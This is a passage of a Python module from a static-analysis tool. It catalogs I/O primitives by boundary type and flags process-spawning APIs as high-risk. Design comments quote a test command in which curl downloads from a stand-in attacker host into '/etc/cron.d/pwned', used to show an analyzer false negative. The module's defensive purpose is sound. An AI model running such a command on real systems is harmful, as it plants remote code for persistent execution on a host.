# SPDX-License-Identifier: AGPL-3.0-or-later
"""I/O boundary analysis — catalog loading and edge matching (ADR-0016).

Provides a per-language catalog of I/O primitive functions/methods, each
classified by boundary type. The closed set of catalog-declarable boundary
tags is ``CATALOG_BOUNDARY_TYPES`` below (fs_read/fs_write, net_send/net_recv,
ipc_recv/ipc_send, env_read/env_write, subprocess, db_read/db_write,
process_send, logging, browser_storage_read/browser_storage_write); the
synthesized ``external_potential`` and disclosed ``command_launch`` complete
``KNOWN_IO_BOUNDARIES``. Catalogs are YAML files in the ``io_primitives/``
directory alongside this module.

How It Works
------------
1. ``load_catalog(language)`` reads the YAML for the given language and
   returns an ``IoBoundaryCatalog`` with a flat list of ``IoPrimitive``
   entries plus O(1) lookup by qualified name.
2. ``match_edge_to_primitive(catalog, callee_name)`` checks whether a
   call-edge target matches any I/O primitive, returning the match or None.
3. Downstream code (the boundary-tagging pass, Phase 1b) uses these
   matches to stamp ``io_boundary`` and ``io_primitive`` metadata onto
   edges in the graph.

Why YAML Catalogs
-----------------
The set of stdlib I/O functions per language is finite and stable — it
changes only with major language releases. Externalising the list to YAML
keeps the analysis logic independent of any single language, reuses the
pattern established by ADR-0015 dataflow YAML, and makes it easy to
add new languages or community-contributed corrections.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any, Iterable, Optional, Sequence

import yaml

from .axis_meta_keys import write_meta_key
from .edge_types import is_grpc_rpc_implementation
from .ir import symbol_name_slot, symbol_path_slot

if TYPE_CHECKING:
    from .ir import Edge, ExternalRef


# ---------------------------------------------------------------------------
# io-boundaries --json envelope schema version (Phase 1 PR-B)
# ---------------------------------------------------------------------------
# The ``io-boundaries`` JSON envelope is a *separate* wire contract from
# the behavior-map envelope (which has its own ``schema_version`` value
# starting at 0.1.0, emitted by ``cli.py`` at the run/sketch/slice
# sites). Prior to PR-B the io-boundaries output had no version field;
# this constant pins the inaugural ``1.0`` and locks the top-level
# envelope shape produced by :meth:`BoundaryMap.to_dict` (and by the
# filtered-output path in ``cmd_io_boundaries``).
#
# Top-level envelope keys (post-PR-B):
#   - schema_version: str (this constant)
#   - total_io_edges: int
#   - boundaries: dict[str, BoundaryMapEntry.to_dict()]
#   - unsupported_languages: list[str]  (added by ``cmd_io_boundaries``)
#
# Bumping rules:
#   - Adding a new top-level key: minor bump (1.0 -> 1.1).
#   - Renaming or removing a key, or changing a value type: major bump
#     (1.0 -> 2.0).
#   - Changes to ``BoundaryMapEntry.to_dict()`` / ``IoChain.to_dict()``
#     shape are part of this same contract — they share the version.
IO_BOUNDARIES_SCHEMA_VERSION: str = "2.1"  # WI-javoh: command_launch_edges added (command-mediated launches disclosed, excluded from total_io_edges). 2.0: WI-huhit/WI-foduh total_io_edges redefined + external_potential_edges added


# ---------------------------------------------------------------------------
# Canonical I/O boundary vocabulary
# ---------------------------------------------------------------------------
# ``CATALOG_BOUNDARY_TYPES`` is the closed set of boundary tags that an
# io-primitives catalog YAML may declare: ``_parse_catalog`` iterates
# exactly these keys, so any other key in a catalog is silently ignored.
# ``compute_boundary_map`` additionally synthesizes one boundary that no
# catalog declares — ``external_potential`` — for unmatched first-party
# call edges (see ``_compute_external_potential``).
#
# ``KNOWN_IO_BOUNDARIES`` is therefore the complete universe of names that
# can ever appear as a ``BoundaryMap.entries`` key. ``verify_claims`` uses
# it to validate a claim's ``constraint.boundary`` at load time so an
# unknown/typo'd boundary errors instead of silently confirming a
# ``must_not_exist`` claim against a boundary the analyzer never produces
# (INV-gobob / WI-ruzib). Validating against this canonical set — not
# against the keys present in a *given* map — is deliberate: a repo that
# legitimately has zero ``net_send`` chains must still accept a
# ``must_not_exist: net_send`` claim and confirm it.
#
# WI-lokuv / WI-kanir-huzuj: browser-local storage (``browser_storage_*``)
# is structurally distinct from host filesystem — reachable via XSS, not
# via local-user FS access. Paired with the ``browser_storage`` trust zone
# in taint.py. The read side (browser_storage_read) is intentionally NOT in
# AUTO_SOURCE_LABEL_MAP — matching how fs_read is treated — because the
# sensitivity of a browser storage read depends on what's stored
# (project-local catalogs can add taint_sources entries for their threat
# model).
CATALOG_BOUNDARY_TYPES: tuple[str, ...] = (
    "fs_read", "fs_write", "net_send", "net_recv",
    "ipc_recv", "ipc_send", "env_read", "env_write",
    "subprocess", "db_read", "db_write",
    "process_send", "logging",
    "browser_storage_write",
    "browser_storage_read",
)
KNOWN_IO_BOUNDARIES: frozenset[str] = frozenset(
    CATALOG_BOUNDARY_TYPES + ("external_potential", "command_launch"),
)

# Boundaries that are DISCLOSED but EXCLUDED from the ``total_io_edges``
# headline (the verified/curated I/O surface). ``external_potential`` is
# receiver-unresolved speculative noise (WI-huhit/WI-foduh); ``command_launch``
# is the high-volume, definite-but-uncurated command-mediated launch cohort
# (WI-javoh). Both are surfaced in their own ``BoundaryMap`` count fields so a
# consumer sees them without them inflating the headline.
_DISCLOSED_ONLY_BOUNDARIES: frozenset[str] = frozenset(
    {"external_potential", "command_launch"},
)

# Boundaries whose classification records that the analysis CANNOT SEE PAST the
# call, rather than a known and complete I/O surface (INV-gahuz).
#
# THE DISTINCTION THIS DRAWS, and why it is a property of the vocabulary rather
# than of any one consumer. Every other boundary names something the catalogue
# KNOWS a primitive does: ``os.makedirs`` is an ``fs_write`` and that is the
# whole of its I/O, so a call to it is an examined negative for a network claim.
# A ``subprocess`` row asserts the opposite — that control leaves this process
# for a program whose behaviour is not in the edge set at all. Both are correct
# classifications; only one of them licenses "I looked and found nothing".
#
# WHY ``subprocess`` IS THE ONLY MEMBER, and this is a closed question rather
# than an oversight. ``_parse_catalog`` iterates exactly
# ``CATALOG_BOUNDARY_TYPES``, so a catalog can never declare anything outside
# it; ``external_potential`` and ``command_launch`` are synthesised, never
# declared, and already excluded from the verified surface by
# ``_DISCLOSED_ONLY_BOUNDARIES`` above. ``subprocess`` is therefore the single
# catalog-declarable boundary that means opacity. If a future boundary is added
# to ``CATALOG_BOUNDARY_TYPES`` whose meaning is "control left this process",
# it belongs here too, and the axis-conformance tests are what will ask.
#
# MEASURED CONSEQUENCE OF NOT HAVING THIS (the reason it exists): a six-line
# program whose only statement is ``subprocess.run(["curl", "-o",
# "/etc/cron.d/pwned", "https://evil.example/p"])`` returned ``confirmed`` rc 0
# for BOTH a ``fs_write`` and a ``net_send`` ``must_not_exist`` claim, while
# ``open(f, "w")`` and ``socket.send`` controls returned ``violated`` rc 1 in
# the same session.
OPAQUE_BOUNDARIES: frozenset[str] = frozenset({"subprocess"})

# The SAME question — "did control leave this process?" — asked of the other
# channel (INV-larol). A boundary here is SYNTHESISED BY A PRODUCER rather than
# declared by a catalogue, so ``declares_opaque_crossing`` can never see it: the
# bash analyzer stamps ``meta.io_boundary = "command_launch"`` directly on an
# external-command edge (bash.py, WI-javoh) because there is no bash catalogue
# to match against and, per ADR-0016's implementation note, there is not going
# to be one — cataloguing ``curl`` as ``net_send`` would attribute curl's
# network activity to the shell script, and no clean invariant separates
# ``curl`` from ``git``.
#
# DISJOINT FROM ``OPAQUE_BOUNDARIES`` BY CONSTRUCTION, and the split is the
# point rather than an accident of naming. A catalog-declarable boundary is
# inert unless it is in ``CATALOG_BOUNDARY_TYPES``; a producer-stamped one is
# inert if it IS, because ``_parse_catalog`` iterates exactly that tuple and
# the catalogue channel would then be the one carrying it. Each set is
# reachable through exactly one channel, and a test asserts each direction —
# collapsing them into a single set makes one half unreachable whichever way it
# is spelled.
#
# WHY THIS WAS NOT LIVE WHEN IT WAS WRITTEN, and what arms it. bash ships no
# catalogue, so ``_external_call_sites`` drops its edges on ``catalog is None``
# and the INV-dabov language gate answers first. The hole is held shut by the
# ABSENCE OF ONE FILE that three places in this tree recommend adding. Measured
# on the shipped CLI over a two-line script whose only command is
# ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
# filesystem": with no bash.yaml, ``inconclusive`` rc 2; with a six-line
# ``curl -> net_send`` bash.yaml, ``confirmed`` rc 0 — a green tick over a write
# into a root cron directory. Declaring ``subprocess`` alongside restores the
# refusal, which is the control proving the row matched and the boundary
# choice — not the analyzer's sight — decided the verdict.
PRODUCER_OPAQUE_BOUNDARIES: frozenset[str] = frozenset({"command_launch"})


# ---------------------------------------------------------------------------
# Provenance allowlist (Plan C, PR B)
# ---------------------------------------------------------------------------
# Hostnames that are permitted as the host of a catalog's
# ``stdlib_provenance.source_url``.  Match is suffix-based, so
# ``docs.python.org`` matches the ``python.org`` suffix.  This defends
# against typos and unofficial sources: a catalog declaring
# ``status: complete`` with provenance pointing at, say,
# ``stackoverflow.com`` is rejected at load time.
#
# Adding to this list is a governance change — additions go through PR
# review with justification (same shape as ``ALLOWED_WEBSITES.md``).
# Each entry must be the official documentation host of a programming
# language's stdlib (or a closely-related authority such as MDN for
# browser globals, cppreference.com for C/C++, GNU for libc).

ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES: frozenset[str] = frozenset({
    # Python
    "python.org",
    # Go
    "golang.org", "go.dev", "pkg.go.dev",
    # Rust
    "rust-lang.org",
    # JavaScript / Node / browsers
    "nodejs.org", "developer.mozilla.org",
    # Java / JVM ecosystem
    "oracle.com", "openjdk.org",
    # C# / .NET
    "microsoft.com", "dotnet.microsoft.com",
    # Apple platforms (Swift, Objective-C)
    "apple.com", "developer.apple.com", "swift.org",
    # JVM offshoots
    "kotlinlang.org", "scala-lang.org",
    # BEAM
    "elixir-lang.org", "hexdocs.pm", "erlang.org",
    # Functional family
    "haskell.org", "ocaml.org", "clojure.org",
    # Other major languages
    "ruby-lang.org", "dart.dev", "php.net", "perl.org",
    "crystal-lang.org", "nim-lang.org", "ziglang.org",
    "julialang.org", "racket-lang.org", "tcl-lang.org",
    "lua.org", "r-project.org",
    # C / C++ / POSIX
    "cppreference.com", "gnu.org", "man7.org",
    "openbsd.org", "freebsd.org", "netbsd.org",
    "opengroup.org",
    # Standards bodies (ISO C, ISO C++, RFCs)
    "iso.org", "ietf.org",
})


def _validate_catalog_dict(
    language: str, status: str, provenance: Optional[dict[str, Any]],
) -> None:
    """Validate a catalog dict against the Plan C, PR B governance rules.

    For ``status: complete``, ``stdlib_provenance`` MUST be present and
    its ``source_url`` MUST be an HTTPS URL whose hostname suffix-matches
    an entry in :data:`ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES`.  For
    ``status: in_progress``, no provenance is required.

    Raises ``ValueError`` on any violation.  Called from
    :meth:`IoBoundaryCatalog._from_dict` so violations surface at load
    time, not at edge-matching time.
    """
    if status not in ("complete", "in_progress"):
        raise ValueError(
            f"Catalog for {language!r} has invalid status {status!r}; "
            f"expected 'complete' or 'in_progress'.",
        )
    if status != "complete":
        return
    if not provenance or not provenance.get("source_url"):
        raise ValueError(
            f"Catalog for {language!r} has status='complete' but no "
            f"stdlib_provenance.source_url. Either declare a provenance "
            f"URL or set status to 'in_progress'.",
        )
    url = provenance["source_url"]
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        raise ValueError(
            f"Catalog for {language!r} has stdlib_provenance.source_url "
            f"{url!r} — must use https scheme.",
        )
    hostname = parsed.hostname or ""
    matched = any(
        hostname == suffix or hostname.endswith("." + suffix)
        for suffix in ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES
    )
    if not matched:
        raise ValueError(
            f"Catalog for {language!r} has stdlib_provenance.source_url "
            f"{url!r} whose hostname {hostname!r} does not suffix-match "
            f"the allowlist (ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES). Add "
            f"the hostname suffix to the allowlist if it is the official "
            f"documentation source for the language's stdlib.",
        )


# ---------------------------------------------------------------------------
# High-risk primitives (subprocess-scoped display refinement)
# ---------------------------------------------------------------------------
#
# ``high_risk`` is a DISPLAY-ONLY triage marker on the ``io-boundaries``
# output (the CLI ``*** HIGH RISK ***`` markers + the ``high_risk`` /
# ``has_high_risk`` JSON keys). It has NO verify-claims / taint / slice
# consumer, so a wrong classification is an audit-UX false negative, not a
# soundness bug.
#
# It is deliberately SCOPED TO ``subprocess``: launching an external program
# is arbitrary code execution, the one boundary with a clean "always risky"
# invariant (ratcheted by ``TestHighRiskPrimitivesDriftGuard``). It is NOT a
# net/fs risk taxonomy. The canonical, ADR-backed risk model for I/O
# boundaries is the taint source/sink model in ``taint.py``
# (``AUTO_SINK_ZONE_MAP`` / ``AUTO_SOURCE_LABEL_MAP``; ADR-0017 §2b; spec
# §"Taint sinks/sources") — write-side/egress boundaries are untrusted
# sinks, read-side sensitive boundaries are untrusted sources — and that is
# what verify-claims actually consumes. Destructive-filesystem and
# network-egress risk are carried there (network risk additionally at the
# chain ``dst_tier`` level), NOT curated here. Curating them here was a
# deliberately-rejected idea (WI-gitad 2026-05-28, WI-sugav, WI-jihuj): a
# hand-maintained net/fs ``high_risk`` set duplicated the taint taxonomy,
# disagreed with it on ``fs_write`` (taint: every write is a sink;
# ``high_risk``: only destructive writes), and could never be principled.
HIGH_RISK_PRIMITIVES: frozenset[str] = frozenset({
    # Subprocess / code execution — Python. Every boundary=subprocess
    # catalog entry across the 14 languages must appear here or in
    # HIGH_RISK_EXEMPTIONS_SUBPROCESS (TestHighRiskPrimitivesDriftGuard).
    "subprocess.Popen", "subprocess.run", "subprocess.call",
    "subprocess.check_call", "subprocess.check_output",
    "os.system", "os.popen", "os.execv", "os.execve", "os.execvp",
    "os.execvpe", "os.execl", "os.execle", "os.execlp", "os.execlpe",
    "os.fork", "os.forkpty",
    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
    # Go
    "os/exec.Command", "os/exec.CommandContext",
    "os/exec.Cmd.CombinedOutput", "os/exec.Cmd.Output",
    "os/exec.Cmd.Run", "os/exec.Cmd.Start",
    "golang.org/x/sys/execabs.Command", "golang.org/x/sys/execabs.CommandContext",
    "syscall.Exec", "syscall.ForkExec",
    # Java / Kotlin / Scala (JVM ProcessBuilder is shared)
    "java.lang.ProcessBuilder.start", "java.lang.Runtime.exec",
    "java.lang.ProcessBuilder.command",
    "scala.sys.process.Process.apply", "scala.sys.process.Process.run",
    "scala.sys.process.ProcessBuilder.run",
    "scala.sys.process.ProcessBuilder.lineStream",
    "scala.sys.process.ProcessBuilder.lazyLines",
    # Rust
    "std::process::Command.spawn", "std::process::Command.output",
    "std::process::Command.status", "std::process::Command.new",
    # JavaScript / Node
    "child_process.exec", "child_process.execSync",
    "child_process.spawn", "child_process.spawnSync",
    "child_process.execFile", "child_process.execFileSync",
    "child_process.fork",
    # C / C++
    "unistd.exec", "unistd.execl", "unistd.fork",
    "stdlib.system", "stdlib.popen",
    "unistd.execle", "unistd.execlp", "unistd.execv",
    "unistd.execve", "unistd.execvp",
    "spawn.posix_spawn", "spawn.posix_spawnp",
    # Elixir
    "System.cmd", "System.shell",
    "Port.command", "Port.open",
    # Erlang — the BEAM shell-out and the port primitive it is built on
    # (WI-jupaf). Both were absent here because erlang.yaml declared no
    # subprocess surface at all: `os:cmd/1` was filed under env_read +
    # env_write beside getenv/putenv, and `erlang:open_port/2` was catalogued
    # nowhere. Elixir's own `System.cmd` was listed above the whole time, which
    # is what made the gap look covered for the BEAM family.
    "os.cmd", "erlang.open_port",
    # Haskell (System.Process — `process` package)
    "System.Process.callCommand", "System.Process.callProcess",
    "System.Process.createProcess", "System.Process.rawSystem",
    "System.Process.readCreateProcess",
    "System.Process.readCreateProcessWithExitCode",
    "System.Process.readProcess",
    "System.Process.readProcessWithExitCode",
    "System.Process.spawnCommand", "System.Process.spawnProcess",
    "System.Process.system",
    "System.Process.Typed.readProcess", "System.Process.Typed.runProcess",
    "System.Process.Typed.startProcess",
    "System.Process.Typed.withProcessTerm",
    "System.Process.Typed.withProcessWait",
    # Swift (Foundation.Process — launchPath is the canonical launch site
    # tracked by swift.yaml; there is no separate Process.launch entry).
    "Process.launchPath",
    # Objective-C (Foundation NSTask)
    "NSTask.launch", "NSTask.launchAndReturnError:",
})


HIGH_RISK_EXEMPTIONS_SUBPROCESS: frozenset[str] = frozenset({
    # These qualified names appear in io_primitives YAML catalogs with
    # boundary=subprocess (so taint analysis tracks them) but are
    # intentionally NOT high-risk for display purposes: they operate on
    # an already-launched process (signal, wait, cleanup), terminate the
    # current process without spawning anything, or perform a PATH
    # lookup without executing. The WI-sugav Part 2 drift guard
    # (Tests::TestHighRiskPrimitivesDriftGuard) requires every
    # boundary=subprocess catalog entry to land in either
    # HIGH_RISK_PRIMITIVES or this set.
    #
    # Go — PATH-lookup helpers (string in, string out; no exec).
    "os/exec.LookPath", "golang.org/x/sys/execabs.LookPath",
    # C / C++ — wait on an already-launched child (does not spawn).
    "sys/wait.wait", "sys/wait.waitpid",
    # Rust — terminate the current process (no subprocess spawned).
    "std::process.abort", "std::process.exit",
    # Elixir — halts the BEAM VM (current-process exit).
    "System.halt",
    # Swift Foundation.Process — operate on existing process.
    "Process.interrupt", "Process.terminate", "Process.waitUntilExit",
    # Objective-C NSTask — operate on existing process.
    "NSTask.interrupt", "NSTask.terminate", "NSTask.waitUntilExit",
    # Haskell System.Process — signal / wait / cleanup on existing process.
    "System.Process.cleanupProcess",
    "System.Process.interruptProcessGroupOf",
    "System.Process.terminateProcess",
    "System.Process.waitForProcess",
    "System.Process.Typed.stopProcess",
})


def is_high_risk(primitive_name: str) -> bool:
    """Whether a primitive gets the subprocess ``high_risk`` display marker.

    This is a DISPLAY-ONLY triage flag scoped to ``subprocess`` — launching
    an external program (Popen, exec*, NSTask launch, JVM ProcessBuilder,
    BEAM Port spawning, Haskell System.Process spawn family, …) across all
    14 catalog languages, the one boundary with a clean "always risky"
    invariant. It is NOT a net/fs risk taxonomy: destructive-filesystem and
    network-egress risk are carried by the taint source/sink model
    (``AUTO_SINK_ZONE_MAP`` in ``taint.py``; ADR-0017 §2b) and, for network,
    the chain ``dst_tier`` — see the ``HIGH_RISK_PRIMITIVES`` module comment.
    """
    return primitive_name in HIGH_RISK_PRIMITIVES


def gate_named_entry(hits, name, module_hint, ambiguous_names,
                     *, call_construct=None):
    """Kind-aware no-module-context fallback (io-boundary:F3, INV-tapat/INV-maluk).

    The single shared decision for the *no usable module hint* case across all
    three catalog consumers — :meth:`IoBoundaryCatalog.lookup_with_module`
    (io-boundaries) and taint.py's ``_lookup_named_entry`` (taint match + the
    production propagation path). Duck-typed over ``IoPrimitive`` /
    ``TaintSink`` / ``TaintSource``: each ``hit`` exposes ``.module`` /
    ``.name`` / ``.kind``.

    This is reached only when there is no usable module hint (``module_hint``
    is ``None`` or ``"external"``); callers handle the qualified-name and
    module-filter branches *before* delegating here. With no receiver/module
    evidence:

    * an untyped *method* call (``call_construct == "method"``) cannot be
      verified against the catalogued receiver type, so it never matches — this
      is what closes INV-tapat (no receiver verification) and INV-maluk
      (``str.replace`` matching ``pathlib.Path.replace``);
    * a free-function call may still match, but only a *function*-kind hit —
      a method-kind primitive needs a module hint it does not have here, so
      method-kind hits are filtered out;
    * the ``ambiguous_names`` short-name set is retained as the meta-absent /
      non-Python safety net (the gate is additive — it does not replace it).

    See ``io_boundary_f3_impl_design_06272026.md``.
    """
    if call_construct == "method":
        return None
    non_method = [h for h in hits if h.kind != "method"]
    if not non_method:
        return None
    if ambiguous_names and name in ambiguous_names:
        return None
    return non_method[0]


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class IoPrimitive:
    """A single I/O primitive function or method.

    Attributes:
        boundary: The I/O boundary classification (e.g. "fs_read", "net_send").
        module: The module or class path (e.g. "os", "pathlib.Path").
        name: The function or method name (e.g. "listdir", "read_text").
        kind: Either "function" or "method".
        notes: Optional human-readable notes about classification caveats.
        simultaneous: The primitive genuinely crosses THIS boundary AT THE SAME
            TIME as its other declarations (INV-zumin). Default False, which is
            the safe reading for every other multi-boundary shape.

            A primitive can be declared under several boundaries for three
            different reasons, and only one of them is a defect:

            * DISAMBIGUATED AT MATCH TIME — ``builtins.open`` is fs_read or
              fs_write depending on ``io_mode``. Never both at once.
            * UNDECIDABLE AT THE CALL SITE — C's ``unistd.write`` is fs_write,
              net_send or ipc_send depending on the fd's type. EXACTLY ONE is
              true; which one is not knowable here.
            * SIMULTANEOUSLY TRUE — ``scala.sys.process.Process.apply`` both
              launches a program and (through it) writes files. Nothing to
              disambiguate, and row order silently discarded one.

            THE FIRST TWO ARE INDISTINGUISHABLE FROM THE THIRD IN THE YAML —
            all three look like "several rows, no mode" — which is why this is
            a declared marker rather than something inferred. Inferring it
            would multiply the undecidable rows and manufacture a ``net_send``
            chain for every C write to stdout: a false violation, which is the
            expensive direction.

            It is a property of the PRIMITIVE, but the rows carrying it live in
            different YAML sections by construction (one per boundary), so
            :meth:`IoBoundaryCatalog.simultaneous_boundaries_for` refuses a
            primitive whose rows disagree rather than picking one — a marker
            that is live or inert depending on which section a later editor
            updated would be the row-order hazard again, wearing a new hat.
    """

    boundary: str
    module: str
    name: str
    kind: str  # "function" or "method"
    notes: str = ""
    simultaneous: bool = False

    @property
    def qualified_name(self) -> str:
        """Full dotted name: module.name."""
        return f"{self.module}.{self.name}"


@dataclass
class IoBoundaryCatalog:
    """Loaded I/O primitive catalog for a single language.

    Provides O(1) lookup by qualified name and O(1) lookup by short name
    (unqualified). Short-name lookup may return multiple matches (e.g.
    ``open`` is both fs_read and fs_write).
    """

    language: str
    primitives: list[IoPrimitive] = field(default_factory=list)
    ambiguous_names: frozenset[str] = field(default_factory=frozenset)
    # INV-javam: True when a YAML catalog (or alias/parent) was loaded
    # for this language. False when no catalog exists — this is the
    # signal callers (io-boundaries, taint-flow) use to distinguish
    # "found zero I/O" from "language unsupported". Silent zeros are
    # the class of bug the invariant guards against: output identical
    # to a clean codebase, plus false security confidence in taint-flow.
    is_supported: bool = True
    # Plan C, PR B: catalog completeness status. ``"complete"`` means
    # the catalog enumerates the entire stdlib of the language and has
    # declared ``stdlib_provenance`` (validated at load time).
    # ``"in_progress"`` means the catalog is partial; downstream code
    # (PR C) flags ``external_potential`` reports as unreliable for
    # in-progress languages so absence-of-catalog-hit isn't conflated
    # with "definitely third-party".
    status: str = "complete"
    # Plan C, PR B: provenance of the stdlib symbol list. ``None`` for
    # ``status: in_progress``; required (and validated) for
    # ``status: complete``. Shape: ``{source_url, version, retrieved,
    # notes?}``.
    stdlib_provenance: Optional[dict[str, Any]] = None
    # Plan C, PR B: stdlib qualified names that are NOT I/O primitives
    # (e.g., ``math.sqrt``). Used by the PR C ``external_potential``
    # filter to drop "first-party calls a stdlib non-IO symbol" from
    # the bucket — those aren't catalog gaps. Empty until catalogs
    # populate ``stdlib_other:`` sections.
    stdlib_other: frozenset[str] = field(default_factory=frozenset)
    # F3 PR-C: enumerated stdlib module names for this language. Populated
    # from the authoritative interpreter list (``sys.stdlib_module_names``
    # for Python; equivalent authoritative sources for other languages).
    # Used as input to :meth:`is_stdlib_module`.
    stdlib_modules: frozenset[str] = field(default_factory=frozenset)
    # F3 PR-C: stdlib module name prefixes — useful for languages where
    # stdlib modules live under a hierarchical namespace (e.g. Go's
    # ``encoding/`` family, Java's ``java.*``, Rust's ``std::*``).
    # Membership in :meth:`is_stdlib_module` matches if any prefix is
    # a strict prefix of the queried module (with the module name's
    # separator between prefix and remainder).
    stdlib_prefixes: tuple[str, ...] = field(default_factory=tuple)
    # F3 PR-C: per-module exhaustiveness flag. Module names appearing
    # here are treated as closed-world — i.e., we've audited the
    # module and any unmatched call into it is provably NOT an I/O
    # primitive (so the F3 Filter 2 ``external_potential`` skip is
    # safe for them). The long tail of stdlib modules stays
    # unflagged; Filter 2 does not fire for them. Each entry's value
    # carries the ``retrieved:`` date for provenance, paralleling the
    # catalog-level ``stdlib_provenance.retrieved`` field.
    stdlib_module_completeness: dict[str, str] = field(
        default_factory=dict,
    )
    _by_qualified: dict[str, IoPrimitive] = field(
        default_factory=dict, repr=False,
    )
    # Every row for a qualified name, not just the first. ``_by_qualified``
    # keeps one row per name and that is correct for the single-boundary
    # majority, but a DUAL-CLASSIFIED primitive (``builtins.open`` is
    # ``fs_read`` with its default mode and ``fs_write`` when handed ``"w"``)
    # had its second row dropped here entirely — so ``open(p, "w")``
    # resolved to ``fs_read`` and a real write was invisible. Mode
    # discrimination cannot recover a row the index never kept, so the
    # index has to keep both and let :func:`select_by_mode` choose.
    _by_qualified_all: dict[str, list[IoPrimitive]] = field(
        default_factory=dict, repr=False,
    )
    _by_short: dict[str, list[IoPrimitive]] = field(
        default_factory=dict, repr=False,
    )

    def __post_init__(self) -> None:
        """Build lookup indices."""
        self._rebuild_indices()

    def _rebuild_indices(self) -> None:
        """Rebuild the qualified-name and short-name lookup dicts."""
        self._by_qualified.clear()
        self._by_qualified_all.clear()
        self._by_short.clear()
        for p in self.primitives:
            # Qualified name: first one wins for the single-row index.
            # Duplicates are NOT a data error — see ``_by_qualified_all``.
            if p.qualified_name not in self._by_qualified:
                self._by_qualified[p.qualified_name] = p
            self._by_qualified_all.setdefault(p.qualified_name, []).append(p)
            # WI-vipur: also register a dot-normalized alias so edges
            # emitted in scoped-path mode (``::`` replaced with ``.`` to
            # avoid colliding with the ``:``-delimited edge ID format)
            # still hit the qualified index.  Only relevant for languages
            # whose catalog module names contain ``::`` (Rust, C++).
            dot_form = p.qualified_name.replace("::", ".")
            if dot_form != p.qualified_name:
                self._by_qualified.setdefault(dot_form, p)
                # The alias goes in BOTH indices or the lookups disagree.
                # It was added to only the single-row index once, and every
                # Rust/C++ `::` primitive silently stopped matching — the
                # regression `test_rust.py` caught on `std::env.consts`.
                self._by_qualified_all.setdefault(dot_form, []).append(p)
            # Short name: may have multiple (e.g. open → fs_read + fs_write)
            self._by_short.setdefault(p.name, []).append(p)

    def lookup(self, name: str) -> Optional[IoPrimitive]:
        """Look up a primitive by qualified or short name.

        Returns the first match, or None if not found. For names that
        map to multiple boundaries (like ``open``), use ``lookup_all()``.
        """
        hit = self._by_qualified.get(name)
        if hit is not None:
            return hit
        hits = self._by_short.get(name)
        return hits[0] if hits else None

    def lookup_all(self, name: str) -> list[IoPrimitive]:
        """Look up all primitives matching a qualified or short name.

        Returns all matches (may be empty). Useful for names like ``open``
        that are classified under multiple boundary types.
        """
        # A qualified name can still carry several rows — ``builtins.open``
        # is both ``fs_read`` and ``fs_write``. Returning only the first
        # (which this did) is what hid the write row from every caller.
        hits = self._by_qualified_all.get(name)
        if hits:
            return list(hits)
        return list(self._by_short.get(name, []))

    def all_boundaries_for(self, qualified_name: str) -> set[str]:
        """Every boundary this catalogue declares for one primitive.

        The plain question ``lookup_with_module`` cannot answer, because it
        returns a single :class:`IoPrimitive` and a multi-boundary primitive
        therefore loses all but one declaration to YAML row order (INV-zumin).
        Measured across the fourteen shipped catalogues: 23 multi-boundary
        primitives, 27 declarations unreachable — including
        ``scala.sys.process.Process.apply``, declared ``[fs_write,
        subprocess]`` and tagged ``fs_write``, so the launch was undetectable
        as a subprocess.

        Returns the empty set for a name the catalogue does not carry —
        "asked, nothing declared", which is distinct from ``lookup``'s ``None``
        ("no match") and from a caller that never asked.
        """
        return {
            p.boundary for p in self.primitives
            if p.qualified_name == qualified_name
        }

    def simultaneous_boundaries_for(self, qualified_name: str) -> set[str]:
        """The boundaries a primitive crosses AT THE SAME TIME, or empty.

        The narrow question, and the only one that licenses tagging an edge
        with more than one boundary. Empty for a single-boundary primitive, and
        empty for the two multi-boundary shapes that are NOT simultaneous —
        mode-disambiguated (``builtins.open``) and call-site-undecidable
        (``unistd.write``) — because for those exactly one boundary is true per
        call and reporting both would assert something the analysis never
        established.

        Raises:
            ValueError: if the primitive's rows disagree about ``simultaneous``.
                The flag is a property of the PRIMITIVE while its rows live in
                different YAML sections by construction — one per boundary — so
                a half-declared pair is not a typo to be resolved silently. It
                would make the marker live or inert depending on which section a
                later editor happened to update, which is the row-order defect
                this whole mechanism exists to remove. Failing loudly is the
                only reading that cannot quietly become the bug again.
        """
        rows = [p for p in self.primitives if p.qualified_name == qualified_name]
        if not rows:
            return set()
        flags = {p.simultaneous for p in rows}
        if len(flags) > 1:
            declared = sorted(p.boundary for p in rows if p.simultaneous)
            missing = sorted(p.boundary for p in rows if not p.simultaneous)
            raise ValueError(
                f"{qualified_name}: `simultaneous` is declared on "
                f"{declared} but not on {missing}. It is a property of the "
                f"primitive, so every row for it must agree — a half-declared "
                f"pair silently reintroduces the row-order dependence "
                f"(INV-zumin) it exists to remove."
            )
        if not flags.pop():
            return set()
        boundaries = {p.boundary for p in rows}
        # A SINGLE-BOUNDARY PRIMITIVE IS NEVER "SIMULTANEOUS" — there is nothing
        # for it to be simultaneous WITH. This is not defensive padding: the
        # flag is spelled per ROW, and a row legitimately groups methods that
        # differ in this respect. objc's ``net_send`` row lists the two
        # ``NSURLConnection`` request methods (genuinely both send AND receive)
        # alongside ``connectionWithRequest:delegate:``, which the ``net_recv``
        # row does not carry. Demanding surgical row splits to express that
        # would put the burden on every catalogue author and invite exactly the
        # half-declared pairs the check above rejects. Returning empty here
        # means such a method simply gets its one chain, as before.
        if len(boundaries) < 2:
            return set()
        return boundaries

    def lookup_with_module(
        self, name: str, module_hint: str | None = None,
        *, call_construct: str | None = None,
        allow_short_name_fallback: bool = True,
        io_mode: str | None = None,
    ) -> Optional[IoPrimitive]:
        """Look up a primitive with optional module context for disambiguation.

        When ``module_hint`` is provided and is not ``"external"``, filters
        short-name matches to only those whose ``module`` field is contained
        in the hint (or vice versa).  This prevents false positives like
        ``crypto/rand.Read`` matching ``net.Conn.Read``.

        Falls back to the kind-aware no-module-context gate
        (:func:`gate_named_entry`, io-boundary:F3) when:
        - ``module_hint`` is None or ``"external"`` (no module info available)
        - No filtered match is found (defensive fallback)

        ``call_construct`` (when threaded from the edge's ``meta``) lets the
